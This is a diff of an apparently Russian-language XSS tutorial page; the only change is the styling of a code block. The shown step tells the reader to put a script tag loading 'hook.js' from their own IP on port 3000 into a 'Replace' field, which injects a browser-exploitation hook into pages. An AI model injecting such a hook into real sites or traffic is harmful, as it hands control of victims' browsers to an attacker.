@@ -137,7 +137,7 @@ XSS (Cross Site Scripting, получил аббревиатуру XSS, а не 
   </li>
   <li>
     &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Replace вписывайте:
-    <pre>&lt;script src=”192.168.0/1.x:3000/hook.js”&gt;&lt;/script&gt;&lt;/head&gt;</pre>
+    <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">&lt;script src=”192.168.0/1.x:3000/hook.js”&gt;&lt;/script&gt;&lt;/head&gt;</pre>
     где 192.168.0/1.x - ваш IP-адрес
   </li>
   <li>
